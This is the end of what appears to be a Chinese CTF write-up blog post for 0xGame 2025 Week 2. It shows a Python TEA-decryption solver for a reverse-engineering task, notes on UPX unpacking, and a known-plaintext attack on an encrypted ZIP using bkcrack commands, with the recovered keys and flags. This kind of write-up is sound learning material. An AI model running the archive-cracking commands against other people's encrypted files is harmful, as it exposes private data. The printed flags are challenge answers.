[ctypes.c_uint]</span><br><span class="line">libc.srand.restype = <span class="literal">None</span></span><br><span class="line">libc.rand.argtypes = []</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_keys</span>():</span><br><span class="line">    seed = <span class="number">0xF6950</span></span><br><span class="line">    libc.srand(seed)</span><br><span class="line">    keys = [(libc.rand()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用 TEA 算法解密一个 64 位的数据块。</span></span><br><span class="line"><span class="string">    v: 一个包含两个 32 位无符号整数的元组 (v0, v1)。</span></span><br><span class="line"><span class="string">    k: 一个包含四个 32 位整数的密钥数组。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    v0, v1 = v</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    num_rounds = <span class="number">32</span></span><br><span class="line">    sum_val = (delta * num_rounds) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_rounds):</span><br><span class="line">        term1 = ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        term2 = (v0 + sum_val) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        term3 = ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 = (v1 - (term1 ^ term2 ^ term3)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        term1 = ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        term2 = (v1 + sum_val) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        term3 = ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (term1 ^ term2 ^ term3)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        sum_val = (sum_val - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    enc = <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="number">0xAD</span>, <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0xDC</span>, <span class="number">0xAE</span>, <span class="number">0x5B</span>, <span class="number">0x8A</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0x4E</span>, <span class="number">0xF5</span>, <span class="number">0x4F</span>, <span class="number">0x8F</span>, <span class="number">0x6E</span>, <span class="number">0x5F</span>, <span class="number">0x9D</span>, <span class="number">0x9E</span>,</span><br><span class="line">        <span class="number">0x0A</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x08</span>, <span class="number">0x25</span>, <span class="number">0xAB</span>, <span class="number">0x45</span>, <span class="number">0xC2</span>,</span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0xC9</span>, <span class="number">0x8F</span>, <span class="number">0x43</span>, <span class="number">0x3D</span>, <span class="number">0x51</span>, <span class="number">0xD6</span>, <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0xF6</span>, <span class="number">0x72</span>, <span class="number">0xCD</span>, <span class="number">0xF4</span>, <span class="number">0x2B</span>, <span class="number">0xB4</span>, <span class="number">0x4A</span>, <span class="number">0x3B</span>,</span><br><span class="line">        <span class="number">0xFB</span>, <span class="number">0x36</span>, <span class="number">0x66</span>, <span class="number">0xEF</span>, <span class="number">0xD6</span>, <span class="number">0x8A</span>, <span class="number">0x8C</span>, <span class="number">0xB2</span>,</span><br><span class="line">        <span class="number">0xEB</span>, <span class="number">0x1A</span>, <span class="number">0x9C</span>, <span class="number">0x1B</span>, <span class="number">0x0A</span>, <span class="number">0x9C</span>, <span class="number">0x1F</span>, <span class="number">0x53</span></span><br><span class="line">    ])</span><br><span class="line">    keys = get_keys()</span><br><span class="line"></span><br><span class="line">    decrypted_flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc), <span class="number">8</span>):</span><br><span class="line">        chunk = enc[i:i+<span class="number">8</span>]</span><br><span class="line">        v = struct.unpack(<span class="string">&#x27;&lt;2I&#x27;</span>, chunk)</span><br><span class="line">        decrypted_v = decrypt(v, keys)</span><br><span class="line">        decrypted_chunk = struct.pack(<span class="string">&#x27;&lt;2I&#x27;</span>, decrypted_v[<span class="number">0</span>], decrypted_v[<span class="number">1</span>])</span><br><span class="line">        decrypted_flag += decrypted_chunk</span><br><span class="line">        flag_str = decrypted_flag.decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&#123;&#123;flag_str&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>首先是upx脱壳，但是upx标签被修改成了X1c，用010替换X1c为UPX然后就能脱壳了，脱完之后就能逆向了,得到:</p>
<p><code>0xGame&#123;PANDORA-PANRADOXXX-101AP-9CDE02B83F5D6-7B1A9C348&#125;</code>  flag .</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><ul>
<li><p>先构造一个png文件，，bkcrack只需要12个字节的明文就能爆破，<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code>，文件头是这个。</p>
</li>
<li><p>运行<code>bkcrack.exe -C attachment.zip -c huiliyi.png -p 01.png</code>，爆破得到<code>cdc564be 5675041f 719adb56</code>密钥。</p>
</li>
<li><p>最后<code>bkcrack.exe -C attachment.zip -c flag.txt -k cdc564be 5675041f 719adb56 -d flag_decrypted.txt</code>得到flag</p>
</li>
<li><p><code>0xGame&#123;Y0u_cRacked_M3!z1p_1s_uNsafe!&#125;</code></p>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://futurefe414.github.io">futurefe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://futurefe414.github.io/2025/10/19/0xGame2025Week2WP.html">https://futurefe414.github.io/2025/10/19/0xGame2025Week2WP.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/background/%E4%B8%9C%E6%96%B9/01.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/10/14/VS%E4%B8%ADAvalonia%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE.html" title="VS中使用Avalonia"><img class="cover" src="/images/background/%E7%8B%90%E5%A6%96/21.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">VS中使用Avalonia</div></div><div class="info-2"><div class="info-item-1">跨平台的“现代WPF”Avalonia 是一个 跨平台的 .NET UI 框架，专为构建高性能、视觉一致的桌面应用而设计，同时支持扩展到移动和网页平台。 它使用C#编写，依赖.Net SDK编译，既继承了 WPF 等传统 .NET UI 框架的优势，又解决了其跨平台能力的局限性。 在VS中使用安装VS+SDK从官网安装VS ,然后在VS Installer里根据开发需求选择工作负载安装。 进行 C# 开发一般需要选择 “.NET 桌面开发” 工作负载，如果要进行ASP.NET和 Web 开发，还需选择 “ASP.NET和 Web 开发” 工作负载。  如果在VS Installer里选了C#相关的工作负载安装，那么.Net SDK就已经包含了，若非，可以自行在官网上找你所需要的SDK安装。  安装Avalonia项目模板由于Avalonia是第三方框架，它目前无法直接在VS Installer安装器里勾选安装，而是需要在终端里安装： 1dotnet new install Avalonia.Templates  在CMD &#x2F; PowerShell &#x2F; Deve...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/facial.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">futurefe</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/futurefe414/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.1.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">多线程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E6%95%B0%F0%9F%98%AB%F0%9F%98%AB"><span class="toc-number">1.3.</span> <span class="toc-text">高数😫😫</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Orcale"><span class="toc-number">2.1.</span> <span class="toc-text">Orcale</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFSR"><span class="toc-number">2.2.</span> <span class="toc-text">LFSR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ECC"><span class="toc-number">2.3.</span> <span class="toc-text">ECC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E5%AF%86%E7%A0%81"><span class="toc-number">2.4.</span> <span class="toc-text">流密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LCG"><span class="toc-number">2.5.</span> <span class="toc-text">LCG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PolyRSA"><span class="toc-number">2.6.</span> <span class="toc-text">PolyRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CCB"><span class="toc-number">2.7.</span> <span class="toc-text">CCB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC"><span class="toc-number">2.8.</span> <span class="toc-text">格</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Osint"><span class="toc-number">3.</span> <span class="toc-text">Osint</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%9C%BA"><span class="toc-number">3.1.</span> <span class="toc-text">机场</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-python%E9%80%86%E5%90%91"><span class="toc-number">4.1.</span> <span class="toc-text">baby_python逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-java%E9%80%86%E5%90%91"><span class="toc-number">4.2.</span> <span class="toc-text">baby_java逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B8%8Easm%E6%B1%87%E7%BC%96"><span class="toc-number">4.3.</span> <span class="toc-text">16位程序与asm汇编</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shuffle"><span class="toc-number">4.4.</span> <span class="toc-text">shuffle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TELF"><span class="toc-number">4.5.</span> <span class="toc-text">TELF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-number">5.1.</span> <span class="toc-text">明文攻击</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/19/0xGame2025Week2WP.html" title="0xGame Week2 WP"><img src="/images/background/%E4%B8%9C%E6%96%B9/01.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0xGame Week2 WP"/></a><div class="content"><a class="title" href="/2025/10/19/0xGame2025Week2WP.html" title="0xGame Week2 WP">0xGame Week2 WP</a><time datetime="2025-10-18T16:00:00.000Z" title="Created 2025-10-19 00:00:00">2025-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/14/VS%E4%B8%ADAvalonia%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE.html" title="VS中使用Avalonia"><img src="/images/background/%E7%8B%90%E5%A6%96/21.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VS中使用Avalonia"/></a><div class="content"><a class="title" href="/2025/10/14/VS%E4%B8%ADAvalonia%E6%A1%86%E6%9E%B6%E9%85%8D%E7%BD%AE.html" title="VS中使用Avalonia">VS中使用Avalonia</a><time datetime="2025-10-13T16:00:00.000Z" title="Created 2025-10-14 00:00:00">2025-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/10/0xGame2025Week1WP.html" title="0xGame Week1 WP"><img src="/images/background/%E4%B8%9C%E6%96%B9/07.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0xGame Week1 WP"/></a><div class="content"><a class="title" href="/2025/10/10/0xGame2025Week1WP.html" title="0xGame Week1 WP">0xGame Week1 WP</a><time datetime="2025-10-09T16:00:00.000Z" title="Created 2025-10-10 00:00:00">2025-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/27/Csharp%E6%B5%81%E6%B0%B4%E8%B4%A6-Avalonia.html" title="流水账-Avalonia"><img src="/images/background/%E7%8B%90%E5%A6%96/0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="流水账-Avalonia"/></a><div class="content"><a class="title" href="/2025/09/27/Csharp%E6%B5%81%E6%B0%B4%E8%B4%A6-Avalonia.html" title="流水账-Avalonia">流水账-Avalonia</a><time datetime="2025-09-26T16:00:00.000Z" title="Created 2025-09-27 00:00:00">2025-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/04/Day%2002%20LINQ.html" title="Day 02 LINQ"><img src="/images/background/%E4%B8%9C%E6%96%B9/04.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day 02 LINQ"/></a><div class="content"><a class="title" href="/2025/09/04/Day%2002%20LINQ.html" title="Day 02 LINQ">Day 02 LINQ</a><time datetime="2025-09-03T16:00:00.000Z" title="Created 2025-09-04 00:00:00">2025-09-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By futurefe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="464916877" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>